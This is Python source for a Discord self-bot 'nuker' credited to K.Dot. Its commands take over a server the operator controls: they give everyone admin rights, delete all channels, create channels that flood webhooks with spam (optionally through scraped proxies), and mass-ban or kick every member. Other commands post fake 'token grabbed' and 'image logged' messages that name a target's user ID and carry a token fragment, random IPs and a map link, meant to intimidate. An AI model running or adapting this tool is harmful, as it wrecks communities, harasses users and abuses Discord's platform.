import threading
import discord
from discord.ext import commands
import json
import os
import time
import random
from util.proxies import proxy_scrape, proxy
import threading
import requests
from pystyle import *
from discord import Permissions
import asyncio
from dhooks import *
import base64
from random import randint


__author__ = 'K.Dot#0001'
prefix = ["god ", "God "]
activity = discord.Game(name="!help")
client = commands.Bot(command_prefix = prefix, activity=activity, status=discord.Status.dnd, self_bot = True)

with open(r'config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    CHANNEL_NAMES = config["CHANNEL_NAMES"]
    MESSAGE = config["MESSAGE"]
    PREFIX = config["PREFIX"]
    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
    SERVER_NAME = config["SERVER_NAME"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]

@client.event
async def on_ready():
    print('Logged in as {0.user}'.format(client))

@client.command()
async def nuke(ctx):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))
        try:
            role = discord.utils.get(ctx.guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
        except:
            print("couldn't give everyone admin")
        #for role in ctx.guild.roles:
        #    try:
        #        await role.delete()
        #    except:
        #        print(f"couldn't delete {role}")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print("a")
        for i in range(int(AMMOUNT_OF_CHANNELS)):
            try:
                kdot = await ctx.guild.create_text_channel(name='K.Dot#0001')
                webhook = await kdot.create_webhook(name='K.Dot#0001')
                if PROXIES == True:
                    threading.Thread(target=spamhookp, args=(webhook.url,)).start()
                else:
                    threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print('There was an error while creating channels')
    except:
        print("b")

@client.command()
async def ban_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason= 'Banned by K.Dot#0001')
                print(f'Banned {member.name}')
                asyncio.wait(.5)
            except:
                print(f'Failed to ban {member.name}')
    except:
        print('No more people to ban!')

@client.command()
async def kick_all(ctx): #will rate limit the bot
    try:
        for member in ctx.guild.members:
            await member.kick(reason= 'Kicked by K.Dot#0001')
            print(f'Kicked {member.name}')
            asyncio.wait(.5)
    except:
        print(f'Failed to kick {member.name}')

@client.command()
async def spam(ctx, *, args):
    try:
        await ctx.message.delete()
        for i in range(30):
            await ctx.send(args)
    except:
        print("Failed to spam!")

@client.command()
async def spamhook(ctx, hook):
    try:
        await ctx.message.delete()
        threading.Thread(target=spamhook, args=(hook,)).start()
    except:
        print("Failed to spamhook!")

@client.command()
async def spamhookp(ctx, hook):
    try:
        await ctx.message.delete()
        threading.Thread(target=spamhookp, args=(hook,)).start()
    except:
        print("Failed to spamhook!")

@client.command()
async def fake(ctx, *, arg1, arg2):
    if 'api/webhooks' not in arg1:
        print('That aint no webhook gang')
    else:
        r = requests.get(arg1)
        if r.status_code == 200:
            hook = Webhook(arg1)
            id = arg2

            encodedBytes = base64.b64encode(id.encode("utf-8"))
            encodedStr = str(encodedBytes, "utf-8")#gets first part of token
            ip1 = randint(10, 256)
            ip2 = randint(1, 256)#random ips n stuff
            ip3 = randint(1, 256)
            ip4 = randint(1, 256)
            embed = Embed(
                description=f'<@{id}> got image logged!',
                color=0x00ff00, #Change this color to whatever u want
                timestamp='now'
                )
            embed.set_author(name='K.Dot#0002 (click me)', url='https://discord.gg/3ZqvaCz6zj')
            embed.add_field(name='image logger V1', value=f"Someone got image logged using K.Dot's image logger!")
            embed.add_field(name='T0k3n', value=f'{encodedStr}.||P4gE7B.7xqAjFmkZ2TItDLnriPf5SW3-l0||')#lol this was some kids or bots token I forgot (only last part)
            embed.add_field(name='IP', value=f'||{ip1}.{ip2}.{ip3}.{ip4}||')
            embed.add_field(name='ID', value=f'{id}')
            embed.add_field(name='Username', value=f'<@{id}>')
            embed.add_field(name='Google Maps', value='''||https://google.com/maps/place/@41.77778463166952,-87.61632612687927||''') #O block hit dif
            embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/991717642601779241/1002426761298055188/FEC9A975-BCA8-4B2A-95C5-13AF7C4823EE.jpg')
            embed.set_footer(text=__author__)

            hook.send(embed=embed)
    
@client.command()
async def grab(ctx, *, args):
    await ctx.message.delete()
    id = args
    encodedBytes = base64.b64encode(id.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    message = await ctx.send(f'Grabbing <@{id}> Token')
    await asyncio.sleep(1)
    await message.edit(content='```[#####---------------] 25%```')
    await asyncio.sleep(2)
    await message.edit(content='```[##########----------] 50%```')
    await asyncio.sleep(1)
    await message.edit(content='```[###############-----] 75%```')
    await asyncio.sleep(1)
    await message.edit(content='```[####################] 100%```')
    await asyncio.sleep(2)
    await message.edit(content=f'```Token: {encodedStr}.P4gE7B.7xqAjFmkZ2TItDLnriPf5SW3-l0```')


def spamhookp(hook):
    import sys
    for i in range(30):
        if SPAM_PRN == True:
            requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
        else:
            requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
    sys.exit()
        
def spamhook(hook):
    import sys
    for i in range(30):
        if SPAM_PRN == True:
            requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
        else:
            requests.post(hook, data={'content': MESSAGE})
    sys.exit()

@client.command()
async def restart(ctx):
    await ctx.send('Restarting the bot!')
    await ctx.bot.login(TOKEN)

if PROXIES == True:
    proxy_scrape()

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)

try:
    client.run(TOKEN)
except:
    print('Invalid Token or INTENTS ARE NOT ENABLED\n Please fix or else bot will not function!')
    time.sleep(10)
    os._exit(0)
